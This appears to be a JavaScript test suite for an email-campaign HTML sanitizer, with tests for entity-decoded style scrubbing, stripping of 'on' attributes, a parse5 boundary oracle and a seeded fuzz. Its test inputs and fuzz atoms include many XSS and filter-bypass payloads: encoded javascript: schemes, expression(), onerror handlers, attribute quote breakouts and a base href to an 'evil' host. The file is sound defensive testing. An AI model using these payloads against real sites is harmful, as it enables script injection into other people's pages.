// ROUND 6, FINDING 3. The URL check has always entity-decoded before sniffing
// a scheme; the inline `style=` scrub did not, so an entity hid a CSS keyword
// from it completely.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — the style attribute is decoded before it is scrubbed (round-6 finding 3)', () => {
  it('an entity-encoded expression() is dropped', () => {
    const out = sanitizeCampaignHtml('<p style="width:&#101;xpression(alert(1))">a</p>')
    expect(out).not.toMatch(/xpression/i)
    expect(parsedAttributes(out).filter((a) => a.name === 'style')).toEqual([])
    expect(out).toContain('a</p>')
  })

  it('an entity-encoded javascript: scheme is dropped', () => {
    const out = sanitizeCampaignHtml('<p style="x:&#106;avascript&colon;alert(1)">a</p>')
    expect(out).not.toMatch(/avascript/i)
    expect(parsedAttributes(out).filter((a) => a.name === 'style')).toEqual([])
  })

  it('a decoded quote cannot break out of the attribute', () => {
    // The decode is what makes this possible at all, so the re-escape is what
    // makes the decode safe: whatever survives the scrub is written back with
    // `&`, `"` and `'` escaped, and the parser sees ONE attribute.
    const out = sanitizeCampaignHtml('<p style="color:red&#34;&#32;onclick&#61;alert(1)">a</p>')
    expect(handlerAttrs(out)).toEqual([])
    expect(parsedAttributes(out).map((a) => a.name)).toEqual(['style'])
  })

  it('is a FIXED POINT: escape, decode, scrub, escape again changes nothing', () => {
    for (const body of [
      '<p style="color:red">a</p>',
      '<p style="font-family:&#34;Segoe UI&#34;,sans-serif">a</p>',
      '<td style="background:url(https://tracker/x.gif)">c</td>',
      '<p style="width:&#101;xpression(alert(1))">a</p>',
      '<p style="a:b&amp;c">a</p>',
    ]) {
      const once = sanitizeCampaignHtml(body)
      expect(sanitizeCampaignHtml(once)).toBe(once)
      expect(sanitizeCampaignHtml(sanitizeCampaignHtml(once))).toBe(once)
    }
  })

  it('an ampersand in a kept value is escaped, and survives a second pass unchanged', () => {
    const out = sanitizeCampaignHtml('<p style="a:b&c">x</p>')
    expect(out).toContain('style="a:b&amp;c"')
    expect(sanitizeCampaignHtml(out)).toBe(out)
  })
})

// ---------------------------------------------------------------------------
// ROUND 6, FINDING 4. Junk attribute NAMES — `on<p`, `on<table`, `on<!--` —
// reached the DOM, because the handler rules were regexes that could only
// describe `on[a-z]+=`. The rule is now structural: any attribute whose name
// starts with `on` goes, value or no value.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — every attribute whose name starts with `on` (round-6 finding 4)', () => {
  const JUNK = [
    '<b on<p>x</b>',
    '<b on<table>x</b>',
    '<b on<!-->x</b>',
    '<b onerror>x</b>',
    '<b onerror=>x</b>',
    '<b onerror= >x</b>',
    '<b ONERROR>x</b>',
    '<img src=x on<style>a{color:red}</style>error=alert(1)>',
    '<b onİ=1>x</b>',
  ]

  for (const body of JUNK) {
    it(`${JSON.stringify(body)} — nothing starting with "on" reaches the DOM`, () => {
      const out = sanitizeCampaignHtml(body)
      expect(handlerAttrs(out)).toEqual([])
      expect(sanitizeCampaignHtml(out)).toBe(out)
    })
  }

  it('a Turkish dotted capital I never drives an offset (it lowercases to TWO code points)', () => {
    // `'İ'.toLowerCase().length === 2`, so lowercasing the DOCUMENT to
    // find attribute names would desynchronise every offset after it. Names
    // are lowercased one at a time, for comparison only.
    expect('İ'.toLowerCase().length).toBe(2)
    const html = '<b İtitle="x" alt="İ">hi</b>'
    expect(sanitizeCampaignHtml(html)).toBe(html)
    expect(markupTagSpans(html)[0].end).toBe(html.indexOf('>') + 1)
  })

  it('a legitimate attribute that merely CONTAINS "on" is untouched', () => {
    const html = '<td colspan="2" font="x">c</td><a href="https://x.ie" rel="noopener">go</a>'
    expect(sanitizeCampaignHtml(html)).toBe(html)
  })
})

// ---------------------------------------------------------------------------
// THE ONE PLACE sanitizeCampaignHtml IS NOT IDEMPOTENT, pinned so it stays
// understood rather than rediscovered. It is PRE-EXISTING and byte-identical
// to the sanitizer round 6 replaced; the round-6 jsdom fuzz is simply the
// first run that generated the shape.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — the literal placeholder prefix can be re-spliced (known, inert)', () => {
  it('a strip welds `@@UN1T_` back together, and a SECOND sanitize then removes it', () => {
    // The sanitizer strips the literal prefix from the INPUT (belt and braces
    // behind the per-call nonce, which is the real defence). A later strip can
    // weld it back out of the host's own text — inert, because it carries no
    // nonce and matches no placeholder regex — and the next call's input strip
    // takes it away again.
    const body = 'a@@UN1T<form>_STYLE_0@@b'
    const once = sanitizeCampaignHtml(body)
    expect(once).toBe('a@@UN1T_STYLE_0@@b')
    expect(sanitizeCampaignHtml(once)).toBe('aSTYLE_0@@b')
    // What it is NOT: a way to make a <style> element appear.
    expect(parsedElements(once)).not.toContain('style')
    expect(sanitizeCampaignHtml(`${body}<style>.a{color:red}</style>`)).toContain('<style>.a{color:red}</style>')
  })

  it('everything else round-trips: sanitizing twice changes nothing', () => {
    for (const body of [
      '<p>Hi <b>there</b></p>',
      '<a href="https://acme.ie/x">go</a><img src="https://acme.ie/a.png" alt="a">',
      '<style>.a{color:red}</style><meta name="viewport" content="x"><p>x</p>',
      '<!--[if mso]><style>.b{color:blue}</style><![endif]--><p>y</p>',
      '<img src=x onerror="alert(1)">',
      '<td style="background:url(https://tracker/x.gif)">c</td>',
    ]) {
      const once = sanitizeCampaignHtml(body)
      expect(sanitizeCampaignHtml(once)).toBe(once)
    }
  })
})

// ---------------------------------------------------------------------------
// THE WALK IS PINNED AGAINST A REAL PARSER.
//
// Everything above rests on one claim: the walk finds tags exactly where an
// HTML parser finds them. That claim is checked here against parse5's own
// source offsets over a corpus of the shapes that have gone wrong — and by the
// same comparison over 100,000 random inputs in the round-6 fuzz harness,
// which found zero disagreements.
// ---------------------------------------------------------------------------
describe('markupTagSpans — parse5 boundary oracle', () => {
  const SQ = String.fromCharCode(39)
  const CORPUS = [
    '<p>hi</p>',
    '<img src=x onerror="alert(1);' + SQ + '<a' + SQ + '">',
    '<s=<x=' + SQ + '><!--</>',
    '<img alt="a<b>c">',
    '<img title="a>b" style="x">',
    '<a<b>text</a<b>',
    '<a href=x" y="z>AAA" BBB=x>',
    '<a href=alert(1)="<!--[if mso]>',
    '<img src=x =' + SQ + '"<!--[if mso]><!--</body>' + SQ,
    '<b x="y"onerror=alert(1)>',
    '<img/onerror=1>',
    '<br//>',
    '<b/ x>',
    '<b =v>',
    '<b a==b>',
    '<b a=>',
    '<b a= >',
    '<b a="1"b=2>',
    '<b a=1/>',
    '<b\t\r\n a=1 >',
    '<b a=1\f b=2>',
    '<div\n>x</div\n>',
    '<p a=1 b = 2 c=' + SQ + '3' + SQ + ' d>',
    '<b <p>x</b>',
    '<b on<p=1>x</b>',
    '<scr<!--ipt>alert(1)</scr<!--ipt>',
    '<a href="/x" title="a<!--b">Link</a>',
    '<!--[if mso]><b>x</b><![endif]-->',
    '<!DOCTYPE html><html><body><p>x</p></body></html>',
    '<b İ=1>x</b>',
    '<b a= c>x</b>',
    '<b a="ß">x</b>',
    '<td background="javascript:1;' + SQ + '<b' + SQ + '">c</td>',
    '<div onclick="alert(1);' + SQ + '<a' + SQ + '">x</div>',
    '<video poster="j:1"></video>',
    '<a href=x>a</a><a href=y>b</a>',
    '<b>1</b><i>2</i><u>3</u>',
    '<p>a<p>b',
    '<table><b>x</b></table>',
    '<b a="1" b=' + SQ + '2' + SQ + ' c=3 d>x</b>',
  ]

  /** parse5's own start/end tag offsets, as `start,end`. */
  function parse5TagOffsets(input) {
    const frag = parse(input, { sourceCodeLocationInfo: true })
    const found = []
    const walk = (n) => {
      const loc = n.sourceCodeLocation
      if (loc && loc.startTag) found.push(`${loc.startTag.startOffset},${loc.startTag.endOffset}`)
      if (loc && loc.endTag) found.push(`${loc.endTag.startOffset},${loc.endTag.endOffset}`)
      for (const c of n.childNodes || []) walk(c)
      for (const c of (n.content && n.content.childNodes) || []) walk(c)
    }
    walk(frag)
    return found
  }

  for (const input of CORPUS) {
    it(`agrees with parse5 on ${JSON.stringify(input)}`, () => {
      const spans = new Set(markupTagSpans(input).map((t) => `${t.start},${t.end}`))
      const missing = parse5TagOffsets(input).filter((o) => !spans.has(o))
      expect({ input, missing }).toEqual({ input, missing: [] })
    })
  }

  it('the oracle is a real detector — a scanner that stops at an inner `<` fails it', () => {
    // Negative control. This is the round-5 scanner's rule ("a partial tag
    // ends at the next tag-opening `<`") applied to the critical payload: it
    // would end the tag at the `<a`, parse5 ends it at the final `>`.
    const input = '<img src=x onerror="alert(1);' + SQ + '<a' + SQ + '">'
    const parse5Span = parse5TagOffsets(input)[0]
    expect(parse5Span).toBe(`0,${input.length}`)
    const partialEnd = input.indexOf('<a')
    expect(partialEnd).toBeGreaterThan(0)
    expect(`0,${partialEnd}`).not.toBe(parse5Span)
    expect(markupTagSpans(input).map((t) => `${t.start},${t.end}`)).toEqual([parse5Span])
  })

  it('the deliberate conditional-comment convention is the ONE place the walk sees more', () => {
    // parse5 reads `<!--[if mso]><b>x</b><![endif]-->` as a single comment and
    // reports no tags inside it. The walk scans the interior as markup on
    // purpose — every Unlayer and Canva export puts the Outlook stylesheet in
    // there, and mso really does parse it — so it reports the <b> as well.
    // That is a walker SUPERSET, never a disagreement about a tag parse5 does
    // report, which is what the corpus above asserts.
    const input = '<!--[if mso]><b>x</b><![endif]-->'
    expect(parse5TagOffsets(input)).toEqual([])
    expect(markupTagSpans(input).map((t) => t.name)).toEqual(['b', 'b'])
  })
})

// ---------------------------------------------------------------------------
// A SEEDED MINI-FUZZ, running the SAME parsed-document invariant the round-6
// harness runs over 100,000 bodies. Two thousand bodies from a fixed seed is
// not a substitute for that run; it is the part of it that can live in CI, so
// a regression in the tokenizer cannot reach main between reviews.
// ---------------------------------------------------------------------------
describe('sanitizeCampaignHtml — seeded mini-fuzz over the parsed invariant', () => {
  const SQ = String.fromCharCode(39)
  const ATOMS = [
    '<select>', '</select>', '<option>', '<title', '<title>', '</title>',
    '<textarea', '</textarea>', '<plaintext>', '<xmp>', '<template>', '<noscript>',
    '<style>', '</style>', '</style foo>', '<style ', 'a{b:c}',
    '<meta name=viewport', '<meta name=viewport>', '<meta name="viewport" content="x">',
    '<script>', '</script>', '<script ', 'alert(1)',
    '<iframe>', '<object>', '<embed>', '<form>', '<base href="//evil/">', '<svg>', '<math>',
    '@@UN1T_', '@@UN1T', '_STYLE_0@@', '_VIEWPORT@@',
    '&#x3C;', '&lt;', '&#60;', '&#106;avascript&colon;',
    ' ', '\r\n', '\f', '\t', 'İ', 'ß',
    '<a href=x>', '</a>', '<a href="javascript:alert(1)">', '<a href=javascript:alert(1)>',
    '<b onclick="a">', '<b onclick=a>', '<b onclick=' + SQ + 'a' + SQ + '>', '<b x="y"onerror=alert(1)>',
    '<img src=x on', 'error=alert(1)', '<img/onerror=alert(1)>',
    '<a<b>', '<a<', '</ x>', '</ ', '</1>', '<?php ?>', '<!x>', '<!', '<!-->', '<!--->',
    '<!--', '-->', '--!>', '<!--[if mso]>', '<![endif]-->', '<!--<![endif]-->',
    '<td style="background:url(http://t/x.gif)">', '<td style="expression(alert(1))">',
    '<td style="@import url(http://t/a)">', '<p style=', 'style="',
    '"', SQ, '=', '>', '<', '/', '/>', '<div', ' href=', ' src=', ' poster=',
    ' formaction=', ' background=', ' action=', ' xlink:href=',
    'hi', '<p>', '</p>', '<b>', '</b>', '<td>', '<tr>', '<table>',
    '<img alt="a<b>c">', '<img src=x <script>', '<a href=alert(1)="<!--[if mso]>',
    '<img src=x =' + SQ + '"<!--[if mso]><!--</body>', '<s=', '=' + SQ, '<x=' + SQ, '=' + SQ + '>', '<a="', '</>',
    '<!--</body>-->', '</body>', '<body>',
  ]

  it('2,000 random bodies, both render paths, all clean', () => {
    let seed = 20260907 // FIXED: a failure here is reproducible by re-running.
    const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff }
    const failures = []
    const started = performance.now()
    for (let i = 0; i < 2000; i++) {
      const k = 1 + Math.floor(rnd() * 8)
      let body = ''
      for (let j = 0; j < k; j++) body += ATOMS[Math.floor(rnd() * ATOMS.length)]
      const once = sanitizeCampaignHtml(body)
      // The one KNOWN exception to idempotence, and it is pre-existing and
      // byte-identical to the sanitizer this replaced: a strip can re-splice
      // the LITERAL placeholder prefix out of text the host wrote either side
      // of a stripped tag (`@@UN1T` + `<form>` + `_STYLE_0@@`), and the NEXT
      // call's input-side prefix strip then removes it. See the test below.
      if (!once.includes('@@UN1T_') && sanitizeCampaignHtml(once) !== once) failures.push([body, ['not idempotent']])
      for (const [path, html] of Object.entries(renderBothPaths(body))) {
        const problems = invariantProblems(parse5Tree(html))
        if (problems.length) failures.push([`${path}: ${body}`, problems])
      }
      if (failures.length > 3) break
    }
    expect(failures).toEqual([])
    // THE BOUND IS DELIBERATELY LOOSE, for the same reason the round-5 timing
    // tests are: 2,000 bodies through both render paths and parse5 measures
    // about 0.6s on a 2024 laptop, and this asserts 6s. What it has to catch
    // is an accidental quadratic that makes this suite unrunnable, not CI
    // jitter — a flaky timing test gets deleted rather than fixed.
    expect(performance.now() - started).toBeLessThan(6000)
  })
})
